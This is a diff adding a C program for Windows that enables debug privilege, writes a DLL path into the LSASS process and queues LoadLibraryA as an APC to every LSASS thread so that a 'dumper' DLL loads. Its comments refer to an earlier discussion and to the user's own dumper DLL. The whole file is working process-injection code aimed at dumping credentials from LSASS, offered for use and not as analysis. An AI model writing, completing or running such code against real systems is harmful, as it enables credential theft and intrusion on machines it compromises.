@@ -1,0 +1,42 @@
+#include <windows.h>
+#include <tlhelp32.h>
+#include <stdio.h>
+
+// Use the SetPrivilege function we discussed earlier here
+// BOOL SetPrivilege(LPCTSTR lpszPrivilege, BOOL bEnablePrivilege) { ... }
+
+int main() {
+    DWORD pid = 0; // You'll need a function to find LSASS's PID
+    char* dllPath = "C:\\path\\to\\your_dumper.dll";
+    SIZE_T pathLen = strlen(dllPath) + 1;
+
+    // 1. Must be Admin to do this!
+    if (!SetPrivilege(SE_DEBUG_NAME, TRUE)) return 1;
+
+    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
+    LPVOID pRemoteBuf = VirtualAllocEx(hProcess, NULL, pathLen, MEM_COMMIT, PAGE_READWRITE);
+    WriteProcessMemory(hProcess, pRemoteBuf, dllPath, pathLen, NULL);
+
+    PVOID pLoadLibrary = (PVOID)GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");
+
+    // 2. Enumerate threads in LSASS and queue the APC to ALL of them
+    THREADENTRY32 te = { sizeof(THREADENTRY32) };
+    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
+
+    if (Thread32First(hSnap, &te)) {
+        do {
+            if (te.th32OwnerProcessID == pid) {
+                HANDLE hThread = OpenThread(THREAD_SET_CONTEXT, FALSE, te.th32ThreadID);
+                if (hThread) {
+                    // This tells the thread: "Next time you take a break, run LoadLibraryA(dllPath)"
+                    QueueUserAPC((PAPCFUNC)pLoadLibrary, hThread, (ULONG_PTR)pRemoteBuf);
+                    CloseHandle(hThread);
+                }
+            }
+        } while (Thread32Next(hSnap, &te));
+    }
+
+    printf("[+] APCs queued. If a thread enters an alertable state, the DLL will load.\n");
+    CloseHandle(hProcess);
+    return 0;
+}
